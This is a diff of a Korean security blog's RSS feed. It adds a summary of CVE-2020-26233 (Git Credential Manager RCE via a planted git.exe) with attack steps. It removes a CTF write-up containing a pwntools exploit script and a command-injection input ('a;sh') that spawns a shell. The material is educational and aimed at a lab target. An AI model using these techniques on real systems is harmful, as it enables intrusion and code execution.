@@ -9,8 +9,40 @@
     <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>hack &amp; life</description>
-    <pubDate>Fri, 15 Jan 2021 08:38:49 GMT</pubDate>
+    <pubDate>Sat, 16 Jan 2021 08:49:34 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>[하루한줄] CVE-2020-26233: Git CLI RCE</title>
+      <link>https://hackyboiz.github.io/2021/01/16/fabu1ous/2021-01-16/</link>
+      <guid>https://hackyboiz.github.io/2021/01/16/fabu1ous/2021-01-16/</guid>
+      <pubDate>Sat, 16 Jan 2021 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.blazeinfosec.com/attack-of-the-clones-2-git-</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.blazeinfosec.com/attack-of-the-clones-2-git-command-client-remote-code-execution-strikes-back/">https://blog.blazeinfosec.com/attack-of-the-clones-2-git-command-client-remote-code-execution-strikes-back/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Git Credential Manager core &lt; 2.0.289</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>악성 repository를 fork 한 피해자의 시스템에 임의의 실행파일을 실행시킬 수 있는 CVE-2020-26233에 대한 세부 정보가 공개되었습니다. 유사한 취약점으로 <a href="https://hackyboiz.github.io/2020/11/06/l0ch/2020-11-06/">CVE-2020-27955</a>가 있습니다.</p><p>git clone은 기본적으로 top-level 디렉터리를 clone 한 후 새로운 git 프로세스를 생성해 재귀적으로 submodule들을 clone 합니다. 만약 repository의 root디렉터리 안에 git.exe라는 이름의 실행파일이 있다면 Git Credential Manager core가 configuration을 읽는 과정에서 해당 파일을 실행하게 됩니다.</p><p>이런 취약점이 발생하는 이유는 다음과 같습니다. 만약 git.exe를 실행하라는 명령어를 받으면 Windows는 우선적으로 현재 디렉터리에 git.exe 실행파일이 있는지 확인하고, 없을 때만 %PATH% 환경 변수를 순회하면서 git.exe를 찾아 실행합니다. </p><p>PoC는 아래와 같습니다.</p><ol><li>새로운 Repository생성, 혹은 기존 Repository에 파일 추가할 수 있는 권한 획득</li><li>windows 실행파일의 파일명을 git.exe로 수정해 업로드</li><li>임의의 사용자가 Repository를 fork 하기를 기다림</li><li>RCE 성공</li></ol>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/git/">git</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/01/16/fabu1ous/2021-01-16/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>[하루한줄] Google master token 탈취를 통한 구글 계정 접근</title>
@@ -648,36 +680,6 @@
       
       
       <comments>https://hackyboiz.github.io/2020/12/29/fabu1ous/no-g/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[Write-Up] Christmas CTF 2020 - oil system</title>
-      <link>https://hackyboiz.github.io/2020/12/29/fabu1ous/oil-system/</link>
-      <guid>https://hackyboiz.github.io/2020/12/29/fabu1ous/oil-system/</guid>
-      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;머릿말&quot;&gt;&lt;a href=&quot;#머릿말&quot; class=&quot;headerlink&quot; title=&quot;머릿말&quot;&gt;&lt;/a&gt;머릿말&lt;/h1&gt;&lt;p&gt;CVE-2020–15647는 Firefox Fennec v68.9.0에서 발생하는 Arbitrary local file</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p>CVE-2020–15647는 Firefox Fennec v68.9.0에서 발생하는 Arbitrary local file access입니다. 파일을 Cache 할 때 해당 파일의 이름을 해쉬 해야 하지만 Firefox Fennec v68.9.0의 <code>content:// URI</code> 로직엔 존재하지 않기 때문에 Arbitrary local file access가 발생합니다. 이런 상황을 pwnable 문제로 구현해봤는데…</p><p><img src="/2020/12/29/fabu1ous/oil-system/1.png"></p><p>unintended solution으로 커멘드 인젝션이 존재합니다. 상위권 솔브가 모두 커멘드 인젝션이더군요… 하하하. 문제 검수 단계에서 커멘드 인젝션에 대한 말이 나와서 수정하고 검증까지 했는데 수정 안된 버전이 대회 때 올라갔네요.</p><p>oil-system 문제를 풀어주신 분들께 정말 죄송합니다. 조금 더 철저하게 준비했어야 됐는데…</p><h1 id="풀이-요약"><a href="#풀이-요약" class="headerlink" title="풀이 요약"></a>풀이 요약</h1><p><img src="/2020/12/29/fabu1ous/oil-system/2.png"></p><p><img src="/2020/12/29/fabu1ous/oil-system/3.png"></p><p>문제 바이너리는 subleq이라는 One-Instruction-Language system 에뮬레이터입니다. subleq 코드를 담고 있는 파일에서 데이터를 읽어와 스택에 저장하고 그 코드를 해석해 동작합니다. subleq코드를 해석하는 함수에 OOB 취약점이 존재해 리턴 값을 조작할 수 있습니다. subleq 코드를 담고 있는 파일을 cache 하는 루틴도 존재하는데 파일의 경로만 바뀔 뿐 파일명을 유지합니다. Write Code 기능으로 flag라는 파일을 생성하고 실제 flag파일이 cache 되도록 리턴 값을 유도하면 됩니다.</p><h1 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h1><ul><li>OOB</li></ul><p><img src="/2020/12/29/fabu1ous/oil-system/4.png"></p><p>위 사진은 함수 subleq()의 코드입니다. a2의 index로 사용되는 v4와 v5의 최댓값이 존재하지 않기 때문에 oob write가 가능합니다. v4와 v5값를 이용해 a2보다 높은 주소에 있는 스택 어디든 참조할 수 있게 되고 리턴 값을 오염시킬 수 있습니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1234</span>)<span class="hljs-comment"># Write Code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendafter(<span class="hljs-string">&#x27;Enter your Program\&#x27;s Name : &#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Enter Code : &#x27;</span>,<span class="hljs-string">&#x27;4 166 -1 -1 -1054&#x27;</span>)<span class="hljs-comment"># Run Code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-comment"># Get flag with View Cached code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)p.interactive()</code></pre><pre><code class="hljs routeros">[+] Opening<span class="hljs-built_in"> connection </span><span class="hljs-keyword">to</span> localhost on<span class="hljs-built_in"> port </span>1234: Done[*] Switching <span class="hljs-keyword">to</span> interactive modeXMAS&#123;U5e_Ma11oc_Nex7_tim3_Mr_Kim&#125; ========[ Menu ]======== 1. Read test description 2. Write Code 3. <span class="hljs-builtin-name">Run</span> Code 4. View Cached code &gt; TIMEOUT[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive</code></pre><h1 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h1><ul><li>unintended solution</li></ul><p><img src="/2020/12/29/fabu1ous/oil-system/5.png"></p><p>파일명 필터 함수입니다. 파일명에 영문 소문자 이외의 입력이 들어온다면 프로세스를 종료합니다. 안타깝게도 유심히 보시면 첫 글자만 검사한다는 것을 알 수 있습니다. <s>문제 만든 놈이 픵신인듯</s></p><pre><code class="hljs plain"> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[ Menu ]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 1. Read test description 2. Write Code 3. Run Code 4. View Cached code &gt; 2 Enter your Program&#39;s Name : a;sh Enter Code : your an idiot &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[ Menu ]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 1. Read test description 2. Write Code 3. Run Code 4. View Cached code &gt; 3 Error while fopen$ cat flagXMAS&#123;U5e_Ma11oc_Nex7_tim3_Mr_Kim&#125;$</code></pre>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/oob/">oob</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/12/29/fabu1ous/oil-system/#disqus_thread</comments>
       
     </item>
     
